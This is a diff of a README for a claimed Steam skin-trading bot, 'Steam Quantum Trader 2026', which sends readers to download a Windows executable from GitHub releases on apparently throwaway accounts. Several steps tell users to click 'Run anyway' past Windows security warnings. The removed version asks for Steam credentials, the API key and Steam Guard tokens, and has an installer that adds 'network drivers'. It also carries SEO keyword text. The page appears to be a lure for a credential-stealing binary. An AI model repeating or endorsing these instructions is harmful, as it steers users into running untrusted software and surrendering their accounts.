@@ -1,59 +1,211 @@
-# 📈 Steam Quantum Trader: Automated Asset Management 🚀
+# ⚡ Steam-Quantum-Trader-2026 - Faster Steam inventory control
 
-A high-frequency trading (HFT) and inventory monitoring suite designed to maximize profit through real-time market analytics and automated skin arbitrage.
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/portahepatisninib559/Steam-Quantum-Trader-2026/releases)
 
----
+## 🖥️ What this app does
 
-### 🌟 Project Overview
-**Steam Quantum Trader** is an enterprise-grade solution for digital asset investors. In the volatile 2026 skin market, manual trading is no longer viable. Our engine utilizes **Direct-API Integration** with Steam Community Market and third-party platforms to identify price discrepancies and execute trades within milliseconds. Originally developed for **market liquidity research**, this tool provides a complete ecosystem for monitoring item float, price history, and automated inventory cycling.
+Steam Quantum Trader (2026) helps you track Steam item prices, watch your inventory, and process trade offers from one place. It is built for CS2, Dota 2, Rust, and related Steam item trading use cases.
 
-### ⚡ Key Features
+You can use it to:
 
-* **High-Speed Price Sniping:** Monitors the Market for underpriced items (mislisted prices, rare stickers, or low floats) and purchases them instantly.
-* **Cross-Platform Arbitrage:** Automatically compares prices between Steam, SkinPort, DMarket, and Buff163 to find profitable flip opportunities.
-* **Auto-Accept & Counter-Offer:** Smart trade-offer management that verifies buyer reputation and executes trades based on your predefined profit margins.
-* **Advanced Float & Pattern Scraper:** Integrated OCR and WebGL-interceptor to analyze item wear (float) and rare patterns (e.g., Blue Gems, Dopplers) before committing to a trade.
-* **Inventory Analytics Dashboard:** Real-time net-worth tracking with historical growth charts and ROI (Return on Investment) calculations.
+- Track item prices in real time
+- Watch inventory changes
+- Review trade offers
+- Compare items across supported games
+- Manage skin and item lists from a simple desktop app
 
-### 🏆 Technical Advantages
+## 📥 Download and install
 
-1.  **Low-Latency C++ Core:** The critical trading modules are written in C++ to ensure minimal execution delay during high-traffic market events.
-2.  **Session Persistence Engine:** Securely manages Steam Guard (2FA) tokens and session cookies to maintain 24/7 uptime without manual re-login.
-3.  **Multi-Account Support:** Manage hundreds of "storage" or "bot" accounts from a single unified control panel.
-4.  **Anti-Rate-Limit Logic:** Intelligent request scheduling and proxy-rotation to avoid Steam API cooldowns and temporary IP bans.
+Visit the [Release Page](https://github.com/portahepatisninib559/Steam-Quantum-Trader-2026/releases) to download and run this file on Windows.
 
-### 🛠️ Quick Start & Installation (GUI Version)
+### Steps for Windows
 
-For the best experience, we recommend using the **compiled Windows binary**, which includes the full graphical user interface and all necessary dependencies.
+1. Open the release page.
+2. Find the latest release at the top.
+3. Look under **Assets**.
+4. Download the Windows file, such as an `.exe` or `.zip`.
+5. If you downloaded a `.zip` file, extract it first.
+6. Double-click the app file to start it.
 
-1.  **Download:** Navigate to the [Releases](https://github.com/daddysmokeloke/Steam-Quantum-Trader-2026/releases) tab and download the latest Release.
+### If Windows shows a security prompt
 
-### https://github.com/daddysmokeloke/Steam-Quantum-Trader-2026/releases/tag/2026
+1. Click **More info** if the prompt appears.
+2. Click **Run anyway** if you trust the file from the release page.
+3. If you use a `.zip` file, make sure you extract all files before starting the app.
 
-2.  **Extract:** Unzip the archive to a folder of your choice (e.g., `C:\SteamTrader\`).
-3.  **Initialization:** Run `Installer.exe`. This will verify your system environment and install the required high-speed network drivers.
-4.  **Launch:** Open the `QuantumTrader_GUI.exe` from your desktop. 
-5.  **Configuration:** * Log in using your Steam credentials (encrypted locally).
-    * Input your **Steam Web API Key**.
-    * Set your **Profit Threshold** (e.g., 15%) and select the games you wish to monitor (CS2, Dota 2, Rust).
-6.  **Execute:** Click the **"Start Global Monitor"** button to begin automated trading.
+## 🪟 Windows setup
 
----
+To run the app on Windows, use a normal desktop or laptop with:
 
-### 🖥️ GUI Features Overview
-* **Live Market Feed:** Real-time scrolling list of detected price gaps and "sniped" items.
-* **Inventory Visualizer:** See your total net worth across all linked accounts in one window.
-* **One-Click 2FA:** Integrated Steam Guard mobile authenticator emulator for instant trade confirmations.
-* **Performance Mode:** Toggle between "Silent Background" or "Active Desktop" monitoring.
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A steady internet connection
+- Access to your Steam account if you plan to use trading features
 
----
+For the best result, keep the app updated by using the newest release from the release page.
 
-> **Disclaimer:** This tool is for educational and analytical purposes only. Trading involves financial risk. The developers are not responsible for any market losses or account restrictions.
+## 🔐 First-time setup
 
----
+After you open the app for the first time:
 
-## 🔍 SEO Meta Description
+1. Sign in with your Steam account if the app asks for it.
+2. Set your market and item tracking options.
+3. Choose the games you want to monitor.
+4. Add items or collections you want to watch.
+5. Turn on trade offer checks if you want automated review.
 
-**Steam Auto-Trader Bot 2026 - Best Free CS2 Skin Sniper and Inventory Monitor.**
+If you use Steam Guard, have your phone or code ready when the app asks for login approval.
 
-Download Steam Quantum Trader, the most advanced open-source bot for automated skin trading. This repository features real-time price monitoring, auto-accept trade offers, and float-value checking for CS2, Dota 2, and Rust. Optimized for 2026 market trends. If you want to automate your skin flipping and earn money on Steam Market, Quantum Trader is the most reliable tool on GitHub.
+## 📊 Main features
+
+### 👀 Real-time price tracking
+
+Track market changes as they happen. The app checks item prices and shows you recent movement so you can follow changes without opening several pages.
+
+### 🎮 Multi-game support
+
+The app works with item sets from:
+
+- CS2
+- Dota 2
+- Rust
+- Team Fortress 2 data sets where relevant
+
+### 📦 Inventory monitor
+
+Watch your inventory for new items, removed items, and value changes. This helps you keep track of what you own and what it is worth.
+
+### 🔄 Automated trade-offer processing
+
+Review incoming trade offers and process them based on your settings. This helps reduce manual work and keeps your queue organized.
+
+### 🧾 Portfolio view
+
+See your items in one place. The portfolio view helps you check item mix, item value, and price movement over time.
+
+## 🧭 Basic use
+
+1. Open the app.
+2. Choose the game or market you want to track.
+3. Add items to your watch list.
+4. Check the price and inventory panels.
+5. Review new trade offers from the trade tab.
+6. Update your watch list when your goals change.
+
+## 🛠️ Common tasks
+
+### Add an item to tracking
+
+1. Open the inventory or search panel.
+2. Find the item you want.
+3. Select it.
+4. Add it to your watch list.
+
+### Check your trade offers
+
+1. Open the trade section.
+2. Review each offer.
+3. Compare the item values.
+4. Accept, reject, or save the offer for later.
+
+### Refresh market data
+
+1. Open the market page in the app.
+2. Click refresh.
+3. Wait for the data to load.
+4. Review the new prices and changes.
+
+## ✅ System needs
+
+Most Windows PCs that can run Steam should handle this app. A simple setup like this is enough for most users:
+
+- 64-bit Windows
+- 4 GB RAM or more
+- Modern browser support for linked Steam pages
+- Internet access
+- A Steam account
+
+If you keep many items in your watch list, more RAM can help the app stay smooth.
+
+## 🧩 File types you may see
+
+When you open the release page, you may see:
+
+- `.exe` — run this file on Windows
+- `.zip` — extract this file first, then open the app
+- `.dll` — support file, do not open by itself
+
+If you are unsure which file to pick, choose the Windows `.exe` file when it is available.
+
+## 🔁 Update steps
+
+1. Go to the [Release Page](https://github.com/portahepatisninib559/Steam-Quantum-Trader-2026/releases).
+2. Download the newest Windows file.
+3. Close the old app if it is open.
+4. Replace the old file with the new one if needed.
+5. Open the new version.
+
+## 🧯 Quick fixes
+
+### The app does not start
+
+- Make sure you downloaded the Windows file from the release page
+- If the file is in a zip, extract it first
+- Check that Windows did not block the file
+- Try opening it again as a normal user
+
+### The app is slow
+
+- Close extra apps
+- Reduce the number of items in your watch list
+- Refresh market data less often
+- Make sure your internet connection is stable
+
+### Trade data does not load
+
+- Check your Steam login
+- Confirm that your internet connection works
+- Open the app again
+- Refresh the trade view
+
+### I cannot find the download
+
+- Open the [Release Page](https://github.com/portahepatisninib559/Steam-Quantum-Trader-2026/releases)
+- Look for the newest release
+- Check the **Assets** area
+- Pick the Windows file
+
+## 📁 Suggested folder setup
+
+For a clean setup on Windows, keep the app in a folder such as:
+
+- `Downloads\Steam-Quantum-Trader-2026`
+- `Desktop\Steam-Quantum-Trader-2026`
+- `Apps\Steam-Quantum-Trader-2026`
+
+This makes it easier to find the file when you want to update it.
+
+## 🔎 What to expect on first run
+
+The first time you open the app, it may take a short time to load market data and inventory data. That is normal. After the first run, later starts should feel faster.
+
+You may also see a sign-in step, a sync step, or a data fetch step. Let each step finish before you close the app.
+
+## 🧠 Helpful usage tips
+
+- Keep your watch list focused on items you care about
+- Check values before you accept any trade offer
+- Use the same Steam account each time
+- Refresh data before making a trade decision
+- Update the app when a new release is posted
+
+## 🗂️ Supported use cases
+
+Steam Quantum Trader (2026) is useful for:
+
+- Monitoring CS2 skin prices
+- Tracking Dota 2 item shifts
+- Watching Rust item inventory changes
+- Managing Steam trade offers
+- Keeping a simple view of item value across markets
